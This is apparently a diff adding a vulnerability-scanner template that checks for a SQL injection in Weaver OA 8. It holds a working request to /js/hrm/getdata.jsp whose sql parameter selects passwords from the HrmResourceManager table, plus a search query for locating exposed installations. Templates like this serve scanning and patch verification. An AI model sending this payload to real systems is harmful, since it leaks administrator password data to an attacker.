@@ -1,0 +1,14 @@
+name: Weaver OA 8 SQL injection
+manual: true
+query: app="Weaver-OA"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager
+    expression: response.status == 200 && !response.body.bcontains(b"404 Not Found")
+      && !response.body.bcontains(b"&lt;html&gt;") && response.body.bcontains(b"script")
+expression: r0()
+detail:
+  tags: SQL Injection
